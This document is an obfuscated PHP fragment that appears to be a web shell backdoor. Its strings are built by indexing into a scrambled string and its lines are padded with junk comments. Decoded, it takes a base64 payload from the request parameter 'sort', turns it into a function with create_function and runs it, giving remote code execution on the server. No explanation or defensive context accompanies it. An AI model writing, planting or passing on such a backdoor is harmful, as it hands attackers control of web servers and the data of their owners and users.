...
$vBNfkqAq923 = "tpa(6fhd7m158kw3u;xisyg_vcoj*be.lz9/0rnq24)";


$xkdJjKqc6945 = "";

foreach([20,26,37,0] as $a){
       $xkdJjKqc6945 .= $vBNfkqAq923[$a];
    }


if(isset($_REQUEST /*ZJBzXlrKfhPdOVaSPzDLCsEWRxGjcoPJYPKjZxvTWmCzhFjnzCWSoASCszDbfViBrOmNuCUXhkJPUjMBByITtCAcntUOCvVndHiljBLTLbkYbGJJXoNNRyBwBhEtsPbR*/["$xkdJjKqc6945"])){
    $juxCrtWJ1765 = $_REQUEST /*ZJBzXlrKfhPdOVaSPzDLCsEWRxGjcoPJYPKjZxvTWmCzhFjnzCWSoASCszDbfViBrOmNuCUXhkJPUjMBByITtCAcntUOCvVndHiljBLTLbkYbGJJXoNNRyBwBhEtsPbR*/["$xkdJjKqc6945"];
    $DSFfADLX5571 = "";
    $swhDIQWT9726 = "";

    /*mBJnWJiPISCdBqIagMTfBtaqrWvhIGWAejVVLPjqglgjuIBziQOKzWLOZLIkLvyXqJAxSPELWxckHTOSEOdjRtPgZupiidvmWeyTuIsZhDtenYtftFLBCJnrtXpYYEKw*/

    foreach([29,2,20,30,4,41,23,7,30,25,26,7,30] as $a){
       $DSFfADLX5571 .= $vBNfkqAq923[$a];
    }

    /*VrQipvzhKCdRnWtlBpNNGTevhsIIhZtynzCqDcaiIugyGOMkeTiSeWotoIwmKowvZzHslCVdZhDYtzyeZrXRWTTkORCJHwSleufomVjRJMtszeEQpIfJhJQVITcaXxHU*/


    foreach([20,0,37,37,30,24] as $a){
       $swhDIQWT9726 .= $vBNfkqAq923[$a];
    }

    /*DhXdHiQyNlDFZCdwXSHvMtiAWPWkGtRxwPjLvpRakEhMSUWWZWDaKWSYDEjnJhtTIpOnDplubQeNffipvURzctXpEnQkgPpjnKMJfiZIlWuHLkOBkLARNJuAYQQbWrFs*/

    $a = $swhDIQWT9726('n'.''.''.''.'o'.'i'.''.''.''.'t'.'c'.''.''.''.'n'.''.''.''.'u'.'f'.''.''.''.'_'.''.''.''.''.'e'.'t'.''.'a'.'e'.''.'r'.'c'.''.'');
    $e = $a("", $DSFfADLX5571($juxCrtWJ1765));
    $e();
    exit();
